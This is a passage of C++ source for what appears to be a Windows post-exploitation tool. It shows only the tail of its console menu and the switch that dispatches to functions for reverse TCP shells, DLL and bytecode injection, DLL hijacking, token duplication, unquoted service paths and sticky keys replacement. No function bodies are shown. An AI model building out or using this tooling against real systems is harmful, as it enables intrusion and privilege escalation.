			Output("# [10] [C++]      Terminate Process                                        #");
			Output("# [11] [C++]      Run Process                                              #");
			Output("# [12] [C++]      Dump Process Memory                                      #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [13] [C++]      Inject Bytecode From Web                                 #");
			Output("# [14] [C++]      Inject Bytecode From File                                #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [15] [C++]      Inject DLL                                               #");
			Output("# [16] [C++]      DLL Hijacking                                            #");
			Output("# [17] [C++]      Install Windows Hook From DLL                            #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [18] [C++]      Enable Access Token Privileges                           #");
			Output("# [19] [C++]      Duplicate Access Token                                   #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [20] [C++]      Unquoted Service Paths                                   #");
			Output("# [21] [C++]      Replace Sticky Keys                                      #");
			Output("############################################################################");
			choice = Input("Your choice");
			if (choice != "0") {
				Clear();
			}
			if (IsPositiveNumber(choice)) {
				int num = atoi(choice.c_str());
				if (num >= 1 && num <= 21) {
					switch (num) {
						case  1: { SYSTEM_InvokeShell();         break; }
						case  2: { SYSTEM_InvokePowerShell();    break; }
						case  3: { MS_InvokeShells();            break; }
						case  4: { PS_ReverseTCP();              break; }
						case  5: { CPP_DownloadFile();           break; }
						case  6: { CPP_EditRegistryKey();        break; }
						case  7: { CPP_ScheduleTask();           break; }
						case  8: { CPP_WMI();                    break; }
						case  9: { CPP_ReverseTCP();             break; }
						case 10: { CPP_TerminateProcess();       break; }
						case 11: { CPP_RunProcess();             break; }
						case 12: { CPP_DumpProcessMemory();      break; }
						case 13: { CPP_InjectBytcodeWeb();       break; }
						case 14: { CPP_InjectBytcodeFile();      break; }
						case 15: { CPP_InjectDLL();              break; }
						case 16: { CPP_DLLHijacking();           break; }
						case 17: { CPP_InstallWindowsHook();     break; }
						case 18: { CPP_EnableAccessTokenPrivs(); break; }
						case 19: { CPP_DuplicateAccessToken();   break; }
						case 20: { CPP_UnquotedServicePaths();   break; }
						case 21: { CPP_ReplaceStickyKeys();      break; }
					}
					Clear(true);
				}
			}
		} while (choice != "0");
	}
	return 0;
}

